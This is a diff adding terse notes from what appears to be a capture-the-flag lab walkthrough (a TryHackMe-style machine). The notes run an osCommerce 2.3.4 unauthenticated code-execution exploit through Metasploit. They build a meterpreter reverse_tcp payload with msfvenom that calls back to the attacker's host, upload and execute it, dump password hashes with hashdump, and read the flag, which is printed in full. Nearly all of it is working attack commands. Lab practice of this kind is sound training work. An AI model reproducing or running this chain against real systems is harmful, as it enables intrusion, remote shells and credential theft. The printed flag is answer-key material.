@@ -1,0 +1,37 @@
+Date:Apr/08/2021
+Time:01:40
+
+http://10.10.180.197:8080/
+└─$ msfconsole   
+msf6 > search oscommerce
+msf6 > use 0
+RHOSTS => 10.10.180.197
+RPORT => 8080
+http://10.10.180.197:8080/oscommerce-2.3.4/catalog/install/
+msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI oscommerce-2.3.4/catalog/install/
+LHOST => 10.2.65.134
+
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.65.134 LPORT=6666 -f exe > shell.exe
+└─$ msfconsole -q
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.2.65.134
+LHOST => 10.2.65.134
+msf6 exploit(multi/handler) > set LPORT 6666
+LPORT => 6666
+
+msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
+meterpreter > upload shell.exe
+
+msf6 exploit(multi/handler) > run
+
+meterpreter > execute -f shell.exe
+
+meterpreter > hashdump
+meterpreter > shell
+c:\Users\Administrator\Desktop>more root.txt.txt
+more root.txt.txt
+THM{aea1e3ce6fe7f89e10cea833ae009bee}
+
